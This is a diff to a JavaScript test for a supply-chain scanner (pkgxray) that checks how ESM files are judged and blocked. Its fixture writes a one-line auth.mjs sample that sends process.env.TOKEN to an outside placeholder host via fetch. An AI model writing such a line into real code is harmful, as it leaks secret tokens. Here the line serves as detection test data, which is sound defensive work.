@@ -48,7 +48,7 @@ test('no-flow control never becomes an installation approval', t => {
   assert.equal(report.authorization.installAllowed, false);
 });
 
-test('unsupported ESM source is still available to pkgxray without claiming flow coverage', t => {
+test('ESM flow results and unsupported async evidence both reach pkgxray', t => {
   const f = fixture(t, 'public');
   f.put('auth.mjs', 'export const marker="esm-evidence";fetch("https://example.invalid",{body:process.env.TOKEN});');
   const scannerRoot = scanner(t, `
@@ -59,13 +59,15 @@ test('unsupported ESM source is still available to pkgxray without claiming flow
     }`);
   const report = analyzeWithPkgxray({ root: f.root, entry: 'auth.mjs', scannerRoot });
   assert.equal(report.pkgxray.status, 'completed');
-  assert.equal(report.compose.verdict, 'incomplete');
-  assert.ok(report.gaps.some(g => g.code === 'unsupported-module-format'));
-  assert.equal(report.compose.findings.length, 0, 'Reading ESM bytes is not flow interpretation.');
+  assert.equal(report.compose.verdict, 'review');
+  assert.equal(report.compose.findings.length, 1);
   assert.equal(report.decision, 'block');
   const before = report.compose.packages.find(p => p.id === '.').analyzedContentSha256;
-  f.put('auth.mjs', 'export const marker="esm-evidence-changed";');
+  f.put('auth.mjs', 'export const marker="esm-evidence-changed";export const delayed=async()=>process.env.TOKEN;');
   const after = analyzeWithPkgxray({ root: f.root, entry: 'auth.mjs', scannerRoot });
+  assert.equal(after.compose.verdict, 'incomplete');
+  assert.equal(after.pkgxray.status, 'completed');
+  assert.equal(after.compose.findings.length, 0);
   assert.notEqual(before, after.compose.packages.find(p => p.id === '.').analyzedContentSha256);
 });
 
